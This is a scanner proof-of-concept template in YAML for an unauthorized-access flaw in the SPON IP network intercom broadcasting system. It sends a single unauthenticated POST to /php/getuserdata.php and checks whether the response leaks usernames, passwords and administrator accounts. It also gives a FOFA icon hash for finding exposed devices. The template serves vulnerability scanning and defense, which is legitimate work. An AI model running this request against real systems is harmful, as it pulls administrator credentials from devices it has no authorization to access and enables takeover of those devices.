id: poc-yaml-spon-ip-network-intercom-broadcasting-system-getuserdata-php-unauthorized-access
info:
  name: 世邦通信SPON IP网络对讲广播系统 getuserdata.php 未授权访问漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: IP网络对讲广播系统
  fofa: icon_hash="-1830859634"
requests:
- method: POST
  path: /php/getuserdata.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: jsondata[pageIndex]=0&jsondata[pageCount]=30
  expression: status_code == 200 && contains(body,"\"username\"") && contains(body,"\"password\"")
    && contains(body,"管理员") && !contains(body,"<")
variables: {}
transport: http
